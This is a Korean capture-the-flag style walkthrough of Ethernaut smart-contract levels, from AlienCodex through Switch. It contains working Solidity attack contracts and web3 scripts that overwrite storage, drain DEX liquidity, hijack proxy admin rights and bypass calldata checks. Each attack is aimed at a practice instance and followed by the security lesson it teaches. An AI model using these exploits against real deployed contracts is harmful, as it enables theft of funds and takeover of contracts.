...
`owner`를 내 주소로 바꾸면 클리어된다. `codex.length--`로 동적 배열 길이를 언더플로우시킨 뒤, 배열 인덱스를 계산해 slot 0의 owner를 덮어쓴다.
...
`AlienCodex`는 `Ownable`을 상속한다. 따라서 `owner`는 부모 컨트랙트의 스토리지에 먼저 잡힌다.

스토리지 배치는 다음처럼 보면 된다.

- slot 0: `owner`와 `contact`
- slot 1: `codex.length`
- `codex` 데이터 시작 위치: `keccak256(1)`

먼저 `contacted` modifier를 통과하려면 `makeContact()`를 호출해야 한다.
...
Solidity 0.5에서는 배열 길이 감소 시 언더플로우 검사가 없다. `codex.length`가 0인 상태에서 `retract()`를 호출하면 길이가 `2^256 - 1`이 된다.

이제 `revise(i, content)`로 사실상 임의 스토리지 슬롯을 쓸 수 있다.
...
동적 배열의 `codex[0]`은 slot `keccak256(1)`에 저장된다. 그러면 `codex[i]`가 slot 0을 가리키게 만드는 인덱스는 다음과 같다.

```text
i = 2^256 - keccak256(1)
```

이 인덱스로 `revise()`를 호출하고, `_content`에 내 주소를 `bytes32`로 패딩해서 넣으면 slot 0의 `owner`가 내 주소로 바뀐다.
...
const arraySlot = BigInt(web3.utils.soliditySha3({ type: "uint256", value: 1 }));
const index = (1n << 256n) - arraySlot;
const content = "0x" + player.slice(2).padStart(64, "0");

await contract.revise(index.toString(), content);

await contract.owner();
```

- `makeContact()`: `contacted` modifier를 통과하기 위해 `contact`를 `true`로 만든다.
- `retract()`: `codex.length`를 언더플로우시켜 `2^256 - 1`로 만든다.
- `index`: `codex[index]`가 slot 0을 가리키도록 계산한 값이다.
- `content`: 내 주소를 32바이트로 패딩한 값이다.
- `revise(index, content)`: slot 0을 덮어써 `owner`를 바꾼다.

### 정리

동적 배열의 데이터 위치는 `keccak256(slot)`에서 시작한다. 배열 길이를 언더플로우시키면 매우 큰 인덱스를 통해 다른 스토리지 슬롯까지 덮어쓸 수 있다. Solidity 0.8 이전 코드에서는 이런 산술 언더플로우를 직접 막아야 한다.
...
`withdraw()`가 정상 완료되지 못하게 만들면 클리어된다. `partner.call`에 gas 제한이 없어, 악성 partner가 모든 gas를 소모하면 owner에게 ETH를 보내는 단계까지 도달하지 못한다.
...
주석은 partner가 revert해도 owner는 돈을 받는다고 말한다.

```solidity
// The recipient can revert, the owner will still get their share
```

실제로 `call`의 반환값을 확인하지 않으므로 partner가 단순히 revert하는 경우에는 다음 줄로 넘어갈 수 있다.

하지만 문제는 gas다. `call{value: amountToSend}("")`는 별도 gas 제한 없이 남은 gas를 거의 전부 넘긴다. partner 컨트랙트가 `receive()`에서 무한 루프를 돌며 gas를 모두 소모하면, `withdraw()`는 다음 줄인 owner 전송까지 가지 못하고 실패한다.

공격 순서는 단순하다.

1. 악성 partner 컨트랙트를 배포한다.
2. `setWithdrawPartner(악성컨트랙트주소)`를 호출한다.
3. 이후 `withdraw()`가 호출되면 악성 partner가 gas를 소모해 전체 출금을 막는다.
...
contract DenialAttack {
    constructor(address targetAddress) {
        IDenial(targetAddress).setWithdrawPartner(address(this));
    }
...
Remix에서 `DenialAttack`을 배포할 때 `targetAddress`에는 Ethernaut 인스턴스 주소를 넣는다.

```javascript
contract.address
```

배포 후 partner가 공격 컨트랙트로 바뀌었는지 확인한다.
...
외부 호출에 gas 제한이 없으면 호출 대상이 남은 gas를 모두 소모할 수 있다. 반환값을 무시해도 gas griefing은 막을 수 없다. 외부 호출은 실패 가능성과 gas 소모를 모두 고려해야 한다.
...
상품을 100보다 낮은 가격으로 사면 클리어된다.
`Shop`은 구매자의 `price()` 값을 신뢰해서 가격을 정하는데, 같은 함수 안에서 `price()`를 두 번 호출한다.
...
처음 `price()` 호출은 조건 검사에 사용된다.
이때는 현재 가격인 `100` 이상을 반환해야 한다.

조건을 통과하면 `isSold = true`가 먼저 실행된다.
그 다음 다시 `price()`를 호출해서 실제 저장할 가격을 가져온다.

공격 컨트랙트의 `price()`에서 대상 컨트랙트의 `isSold()` 값을 확인하면, 첫 번째 호출과 두 번째 호출을 구분할 수 있다.

1. `isSold == false`이면 첫 번째 호출이므로 `100`을 반환한다.
2. `isSold == true`이면 두 번째 호출이므로 `1`을 반환한다.
3. 결과적으로 `Shop.price`가 `1`이 된다.
...
Remix에서 `ShopAttack`을 배포할 때 `targetAddress`에는 Ethernaut 인스턴스 주소를 넣는다.
...
`price`가 `100`보다 작고 `isSold`가 `true`이면 성공이다.

### 정리

외부 컨트랙트의 `view` 함수라고 해서 항상 고정된 값을 반환한다고 믿으면 안 된다.
상대 컨트랙트는 호출 시점의 상태를 보고 다른 값을 반환할 수 있다.
같은 외부 함수를 여러 번 호출해서 중요한 판단과 상태 변경에 나눠 쓰는 구조는 위험하다.
...
Dex가 가진 `token1` 또는 `token2`의 잔고를 0으로 만들면 클리어된다.
가격 계산식이 단순해서, 양쪽 토큰을 번갈아 스왑하면 교환 비율이 계속 왜곡된다.
...
취약한 부분은 `getSwapPrice()`다.

```solidity
return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
```

현재 Dex의 토큰 보유량만 보고 가격을 계산한다.
수수료, 슬리피지 제한, 일정 곱 검증 같은 보호 장치가 없다.

초기 상태는 보통 다음과 같다.

```text
player: token1 10, token2 10
dex:    token1 100, token2 100
```

`token1 -> token2`, `token2 -> token1`을 반복하면 Dex 내부 비율이 계속 틀어진다.

스왑 흐름은 다음과 같다.

```text
swap token1 10 -> token2 10
swap token2 20 -> token1 24
swap token1 24 -> token2 30
swap token2 30 -> token1 41
swap token1 41 -> token2 65
swap token2 45 -> token1 110
```

마지막에 `token2`를 전부 넣지 않고 `45`만 넣는 이유는 Dex의 `token1` 잔고가 `110`이기 때문이다.
`45 * 110 / 45 = 110`이 되어 Dex의 `token1`을 정확히 비울 수 있다.
...
AMM 가격 계산은 단순한 잔고 비율만으로 처리하면 쉽게 조작된다.
스왑 후에도 풀의 경제적 불변식이 유지되는지 확인해야 하고, 최소 수령량 같은 슬리피지 보호도 필요하다.
이 문제는 반복 스왑으로 가격 비율을 망가뜨려 한쪽 유동성을 전부 빼내는 문제다.
...
Dex가 가진 `token1`과 `token2` 잔고를 모두 0으로 만들면 클리어된다.
22번 Dex와 비슷하지만, 이번에는 `swap()`에서 토큰 주소가 `token1`, `token2`인지 검사하지 않는다.
...
22번 Dex에는 다음 검증이 있었다.

```solidity
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

그런데 Dex Two에는 이 검증이 없다.
그래서 공격자가 만든 가짜 ERC20 토큰을 `from`으로 넣고, Dex의 진짜 `token1`, `token2`를 `to`로 받을 수 있다.
...
Dex에 가짜 토큰을 `1`개만 넣어두면 다음 계산이 가능하다.

```text
1 * 100 / 1 = 100
```

즉 가짜 토큰 `1`개로 Dex의 `token1` 100개를 전부 가져올 수 있다.
첫 번째 스왑 이후 Dex의 가짜 토큰 잔고는 `2`가 된다.
그 다음 가짜 토큰 `2`개로 `token2`를 스왑하면 다음처럼 계산된다.

```text
2 * 100 / 2 = 100
```

그래서 `token2`도 전부 가져올 수 있다.
...
contract DexTwoAttack {
    ...
    FakeToken private immutable fakeToken;

    constructor(address targetAddress) {
        target = IDexTwo(targetAddress);
        fakeToken = new FakeToken(address(this), 1000);
    }
    ...
    function attack() external {
        ...
        fakeToken.transfer(address(target), 1);
        fakeToken.approve(address(target), type(uint256).max);

        target.swap(address(fakeToken), token1, 1);
        target.swap(address(fakeToken), token2, 2);
    }
}
```

Remix에서 `DexTwoAttack`을 배포할 때 `targetAddress`에는 Ethernaut 인스턴스 주소를 넣는다.
그 다음 `attack()`을 실행한다.
...
Dex Two의 핵심 문제는 `swap()`이 허용된 토큰 쌍을 검증하지 않는다는 점이다.
가격 계산식도 단순한 잔고 비율이라, Dex에 가짜 토큰을 조금 넣어두면 진짜 토큰을 비정상적인 비율로 빼낼 수 있다.
외부 토큰 주소를 받는 함수는 반드시 허용 목록이나 pair 검증이 필요하다.
...
프록시의 `admin`이 되면 클리어된다.
`PuzzleProxy`와 `PuzzleWallet`이 같은 storage를 공유하는데, 변수 배치가 겹쳐서 implementation의 값을 바꾸면 proxy의 값도 바뀐다.
...
이 문제는 두 가지 취약점을 이어서 사용한다.

첫 번째는 storage collision이다.

```text
PuzzleProxy  slot 0: pendingAdmin
PuzzleProxy  slot 1: admin

PuzzleWallet slot 0: owner
PuzzleWallet slot 1: maxBalance
```

프록시가 `delegatecall`로 `PuzzleWallet`을 실행하기 때문에 실제 storage는 프록시 storage를 사용한다.
즉 `PuzzleWallet.owner`는 `PuzzleProxy.pendingAdmin`과 같은 slot이고, `PuzzleWallet.maxBalance`는 `PuzzleProxy.admin`과 같은 slot이다.

먼저 `proposeNewAdmin(player)`를 호출하면 proxy의 `pendingAdmin`이 내 주소가 된다.
같은 slot을 `PuzzleWallet` 관점에서 보면 `owner`가 내 주소가 된 것이다.
그래서 `addToWhitelist(player)`를 호출할 수 있다.

두 번째는 `multicall()`의 `msg.value` 재사용이다.

```solidity
(bool success,) = address(this).delegatecall(data[i]);
```

`multicall()` 안에서 `deposit()`을 직접 한 번 호출하고, 중첩된 `multicall()` 안에서 다시 `deposit()`을 호출하면 같은 `msg.value`가 두 번 잔액에 반영된다.
실제 ETH는 한 번만 들어갔는데 `balances[player]`는 두 번 증가한다.

흐름은 다음과 같다.

1. `proposeNewAdmin(player)`로 `owner`가 된다.
2. `addToWhitelist(player)`로 whitelist에 등록한다.
3. 중첩 `multicall()`로 내 내부 잔액을 실제 입금액보다 크게 만든다.
4. `execute()`로 컨트랙트 ETH를 전부 출금한다.
5. 잔고가 0이 되었으니 `setMaxBalance(uint256(player))`를 호출한다.
6. `maxBalance` slot은 proxy의 `admin` slot이므로 admin이 내 주소가 된다.

### 공격 코드

```javascript
const target = contract.address || contract.target || instance;
const value = await web3.eth.getBalance(target);

const encode = web3.eth.abi.encodeFunctionCall.bind(web3.eth.abi);

const proposeNewAdminData = encode(
  {
...
const addToWhitelistData = encode(
  {
    name: "addToWhitelist",
    type: "function",
...
const nestedMulticallData = encode(
  {
    name: "multicall",
    type: "function",
...
const multicallData = encode(
  {
    name: "multicall",
    type: "function",
    inputs: [{ type: "bytes[]", name: "data" }],
  },
  [[depositData, nestedMulticallData]]
);
...
const withdrawValue = web3.utils.toBN(value).mul(web3.utils.toBN(2)).toString();

const executeData = encode(
  {
    name: "execute",
    type: "function",
    inputs: [
...
const playerAsUint = web3.utils.toBN(player).toString();

const setMaxBalanceData = encode(
  {
    name: "setMaxBalance",
    type: "function",
    inputs: [{ type: "uint256", name: "_maxBalance" }],
  },
  [playerAsUint]
);
...
await web3.eth.sendTransaction({
  from: player,
  to: target,
  data: setMaxBalanceData,
});

await web3.eth.getStorageAt(target, 1);
```

마지막 storage slot 1 값의 뒤 20바이트가 내 주소와 같으면 성공이다.

### 정리

프록시 패턴에서는 proxy와 implementation의 storage layout이 반드시 맞아야 한다.
slot이 겹치면 implementation의 일반 변수를 바꾸는 것만으로 proxy의 관리자 권한을 바꿀 수 있다.
또한 `multicall`처럼 `delegatecall`로 자기 자신을 반복 호출하는 구조에서는 `msg.value`가 중복 반영되지 않도록 중첩 호출까지 막아야 한다.
...
`CryptoVault`에 들어있는 `DoubleEntryPointToken`이 빠져나가지 않도록 Forta 감지 봇을 등록하는 문제다.

`CryptoVault.sweepToken()`은 `underlying` 토큰만 직접 막는다. 그런데 `LegacyToken`은 `transfer()`가 호출되면 실제로 `DoubleEntryPoint.delegateTransfer()`를 호출하도록 위임되어 있다.

즉 `sweepToken(LegacyToken)`을 호출하면 `LegacyToken`을 옮기는 것처럼 보이지만, 실제로는 `CryptoVault`가 가진 `DET`가 빠져나갈 수 있다.
...
이 문제는 직접 탈취하는 문제가 아니라, 탈취 시도를 감지해서 막는 문제다.
...
-> DoubleEntryPoint.delegateTransfer(to, value, origSender)
-> DET가 origSender에서 to로 이동
```

`CryptoVault.sweepToken()`은 `token != underlying`만 검사한다.

`underlying`은 `DoubleEntryPointToken`이므로 `sweepToken(DoubleEntryPoint)`는 막힌다. 하지만 `LegacyToken`은 `underlying`이 아니기 때문에 통과한다.

문제는 `LegacyToken.transfer()`가 실제 전송을 직접 하지 않고 `delegate.delegateTransfer()`를 호출한다는 점이다. 여기서 `delegate`는 `DoubleEntryPoint`다.

따라서 `LegacyToken`을 sweep하면 실제로는 `DoubleEntryPoint.delegateTransfer()`가 실행되고, `origSender`가 `CryptoVault`인 상태로 DET가 빠져나갈 수 있다.

`DoubleEntryPoint.delegateTransfer()`에는 `fortaNotify` modifier가 붙어 있다.

```solidity
forta.notify(player, msg.data);
```

이때 Forta는 플레이어가 등록한 감지 봇의 `handleTransaction()`을 호출한다. 감지 봇에서 `msgData`를 확인해서 `origSender == cryptoVault`이면 `raiseAlert()`를 호출하면 된다.

`delegateTransfer(address to, uint256 value, address origSender)`의 calldata 구조는 다음과 같다.

```text
0x00 ~ 0x03 : function selector
0x04 ~ 0x23 : to
0x24 ~ 0x43 : value
0x44 ~ 0x63 : origSender
```

그래서 감지 봇은 `msgData.offset + 0x44` 위치에서 `origSender`를 읽으면 된다.
...
contract DetectionBot {
    address private immutable forta;
...
Remix에서 `DetectionBot`을 배포할 때 생성자 인자는 다음 값을 넣는다.

```javascript
const fortaAddress = await contract.forta();
const vaultAddress = await contract.cryptoVault();

fortaAddress;
vaultAddress;
```

배포 후 Forta에 감지 봇을 등록한다.

```javascript
const botAddress = "배포한_DetectionBot_주소";
const fortaAddress = await contract.forta();

const setDetectionBotData = web3.eth.abi.encodeFunctionCall(
  {
...
await web3.eth.sendTransaction({
  from: player,
  to: fortaAddress,
  data: setDetectionBotData,
});
```

### 정리

`CryptoVault`는 `underlying` 토큰만 막지만, `LegacyToken`을 통해 우회하면 실제로는 `DoubleEntryPoint` 토큰이 이동할 수 있다.

`Forta` 감지 봇을 등록하고 `delegateTransfer()`의 세 번째 인자인 `origSender`가 `CryptoVault`인지 검사하면 된다.

`origSender == cryptoVault`이면 `raiseAlert()`를 호출하고, `DoubleEntryPoint`의 `fortaNotify` modifier가 alert 증가를 확인해서 트랜잭션을 revert한다.
...
`GoodSamaritan`의 지갑에서 모든 코인을 빼내는 문제다.

정상적으로 `requestDonation()`을 호출하면 10개만 기부받는다. 하지만 받는 쪽이 컨트랙트이면 `Coin.transfer()`가 `notify()`를 호출한다.

이 `notify()` 안에서 의도적으로 `NotEnoughBalance()` 에러를 발생시키면 `GoodSamaritan`이 잔액 부족으로 착각하고 남은 코인을 전부 보내준다.
...
`Coin.transfer()`는 받는 주소가 컨트랙트이면 `notify()`를 호출한다.
...
여기서 공격 컨트랙트의 `notify()`가 `NotEnoughBalance()`로 revert하면, 이 에러는 `GoodSamaritan.requestDonation()`의 `catch`로 전달된다.

`GoodSamaritan`은 에러의 실제 발생 위치를 확인하지 않고, 에러 시그니처만 비교한다.
...
즉 공격 컨트랙트가 같은 이름의 custom error를 발생시키면 `Wallet`에서 잔액 부족이 난 것처럼 속일 수 있다.

그래서 공격 방식은 단순하다.

1. 공격 컨트랙트에서 `requestDonation()` 호출
2. `notify(10)`이 호출되면 `NotEnoughBalance()`로 revert
3. `GoodSamaritan`이 `wallet.transferRemainder()` 실행
4. 남은 코인이 공격 컨트랙트로 전부 전송됨

주의할 점은 `transferRemainder()` 때도 `notify()`가 다시 호출된다는 것이다. 이때까지 revert하면 전체 전송도 실패한다.

따라서 `amount == 10`일 때만 revert하고, 나머지 금액은 정상적으로 받아야 한다.
...
`GoodSamaritan`은 `catch`에서 에러가 어디서 발생했는지 확인하지 않고, 에러 시그니처만 확인한다.

공격 컨트랙트가 `notify(10)`에서 같은 `NotEnoughBalance()` custom error를 발생시키면, `GoodSamaritan`은 지갑 잔액이 부족한 상황으로 오해한다.

그 결과 `transferRemainder()`가 실행되고, 지갑의 전체 코인이 공격 컨트랙트로 이동한다.
...
세 개의 gate를 모두 통과해서 `entrant`가 되어야 하는 문제다.

`construct0r()`는 생성자가 아니라 일반 함수라서 누구나 `owner`를 바꿀 수 있다. 그리고 `SimpleTrick`의 비밀번호는 생성 시점의 `block.timestamp`라서 같은 트랜잭션 안에서 만들고 바로 사용하면 맞출 수 있다.

마지막으로 `GatekeeperThree`에 0.001 ether보다 많은 ETH를 넣고, `owner`가 ETH를 받을 수 없는 컨트랙트가 되게 만들면 세 번째 gate도 통과한다.
...
즉 `owner`는 공격 컨트랙트여야 하고, 실제 트랜잭션을 보낸 `tx.origin`은 플레이어 EOA여야 한다.

`construct0r()`는 이름만 생성자처럼 생겼고 실제로는 public 함수다.
...
공격 컨트랙트에서 `construct0r()`를 호출하면 `owner`가 공격 컨트랙트 주소가 된다.

두 번째 gate는 `allowEntrance == true`여야 한다.
...
`SimpleTrick`의 `password`는 생성될 때 `block.timestamp`로 저장된다.

```solidity
uint256 private password = block.timestamp;
```

따라서 공격 컨트랙트에서 `createTrick()`을 호출하고, 같은 트랜잭션 안에서 `getAllowance(block.timestamp)`를 호출하면 비밀번호가 맞는다.
...
1. `GatekeeperThree` 컨트랙트 잔액이 `0.001 ether`보다 커야 한다.
2. `owner`에게 `0.001 ether`를 보내는 `send()`가 실패해야 한다.

그래서 공격 전에 `GatekeeperThree`에 `0.001 ether`보다 많은 ETH를 넣는다.

그리고 `owner`를 공격 컨트랙트로 만든 뒤, 공격 컨트랙트에는 `receive()`나 `fallback()`을 만들지 않는다. 그러면 `send()`로 ETH를 받을 수 없어서 실패하고 세 번째 gate를 통과한다.
...
contract GatekeeperThreeAttack {
    IGatekeeperThree private immutable target;

    constructor(address targetAddress) {
        target = IGatekeeperThree(targetAddress);
    }

    function attack() external payable {
        require(msg.value > 0.001 ether, "Need more than 0.001 ether");
...
`construct0r()`는 생성자가 아니므로 공격 컨트랙트에서 호출해서 `owner`를 공격 컨트랙트로 바꾼다.

`createTrick()`과 `getAllowance(block.timestamp)`를 같은 트랜잭션에서 호출하면 `SimpleTrick`의 비밀번호를 맞출 수 있다.

마지막으로 `GatekeeperThree`에 `0.001 ether`보다 많은 ETH를 넣고, ETH를 받을 수 없는 공격 컨트랙트를 `owner`로 만들어 `send()`를 실패시키면 `enter()`가 성공한다.

공격 컨트랙트를 배포한 뒤 `attack()` 실행 시 value는 `1000000000000001` wei 이상을 넣으면 된다.
...
`switchOn`을 `true`로 바꾸는 문제다.

겉으로는 `flipSwitch(bytes)`에 `turnSwitchOn()` 데이터를 넣으면 될 것 같지만, `onlyOff` modifier가 calldata의 특정 위치를 검사해서 `turnSwitchOff()` selector만 허용한다.

하지만 검사하는 위치와 실제로 `call()`에 사용되는 `bytes _data` 위치를 다르게 만들 수 있다.

다만 현재 실습 환경에서는 이 문제의 인스턴스 발급이 실패해서 실제 클리어까지는 진행하지 못했다.
...
목표는 `turnSwitchOn()`을 실행해서 `switchOn`을 `true`로 만드는 것이다.

하지만 `turnSwitchOn()`에는 `onlyThis`가 붙어 있어서 외부에서 직접 호출할 수 없다.
...
그래서 반드시 `flipSwitch()`를 통해 `address(this).call(_data)` 형태로 호출해야 한다.

```solidity
(bool success,) = address(this).call(_data);
```

문제는 `flipSwitch()`에 `onlyOff` modifier가 붙어 있다는 점이다.
...
여기서는 calldata의 68번째 바이트, 즉 `0x44` 위치에 있는 4바이트가 `turnSwitchOff()` selector인지 확인한다.

일반적인 ABI 인코딩으로 `flipSwitch(turnSwitchOn())`을 만들면 구조는 다음과 같다.

```text
0x00 : flipSwitch(bytes) selector
0x04 : bytes offset = 0x20
0x24 : bytes length = 0x04
0x44 : bytes data = turnSwitchOn()
```

이러면 `0x44` 위치에 `turnSwitchOn()` selector가 있으므로 modifier에서 막힌다.

핵심은 `onlyOff`가 ABI를 제대로 디코딩하지 않고, 그냥 고정 위치 `0x44`만 본다는 점이다.

따라서 `bytes offset`을 `0x60`으로 밀어버리면 된다.

그러면 `0x44` 위치에는 검사용 `turnSwitchOff()` selector를 넣고, 실제 `_data`는 더 뒤쪽에 둘 수 있다.

```text
0x00 : flipSwitch(bytes) selector
0x04 : bytes offset = 0x60
0x24 : dummy
0x44 : turnSwitchOff() selector  // 검사 통과용
0x64 : bytes length = 0x04
0x84 : turnSwitchOn() selector   // 실제 실행용
```

`onlyOff`는 `0x44`에 있는 `turnSwitchOff()` selector를 보고 통과한다.

하지만 `flipSwitch()`가 실제로 디코딩하는 `_data`는 offset `0x60` 위치에 있으므로, 최종적으로는 `turnSwitchOn()`이 실행된다.
...
contract SwitchAttack {
    function attack(address target) external {
        bytes memory data = abi.encodePacked(
            ...
            uint256(0x60),                 // _data offset
            uint256(0),                    // dummy
            bytes32(bytes4(0x20606e15)),   // turnSwitchOff(), onlyOff 검사 통과용
            uint256(4),                    // _data length
            bytes32(bytes4(0x76227e12))    // turnSwitchOn(), 실제 실행용
        );

        (bool success,) = target.call(data);
        require(success, "Switch attack failed");
    }
}
```

공격 컨트랙트를 배포한 뒤 `attack(instance)`를 호출한다.

인자로 넣는 주소는 문제 인스턴스 주소다. 콘솔에서 확인할 수 있으면 다음 값 중 하나를 쓰면 된다.

```javascript
contract.address || contract.target || instance
```

인스턴스 주소를 못 받는 상태라면 이 풀이를 실행할 대상이 없는 상태다. 그건 calldata 풀이 문제가 아니라 Ethernaut 인스턴스 발급 문제다.

현재 실습에서는 이 단계에서 인스턴스 발급이 되지 않아 실제 공격 실행과 제출은 확인하지 못했다.

### 정리

`onlyOff`는 `_data`를 ABI 디코딩해서 검사하지 않고, calldata의 고정 위치 `0x44`만 검사한다.

그래서 `0x44`에는 `turnSwitchOff()` selector를 넣어 검사를 통과시키고, 실제 `_data` 위치에는 `turnSwitchOn()` selector를 넣는다.

문제 의도는 `bytes` 타입의 ABI 인코딩에서 offset을 조작해 검사 데이터와 실행 데이터를 분리하는 것이다.

풀이 원리는 정리했지만, 현재 환경에서는 Switch 인스턴스 발급이 실패해서 실제 클리어는 하지 못했다.
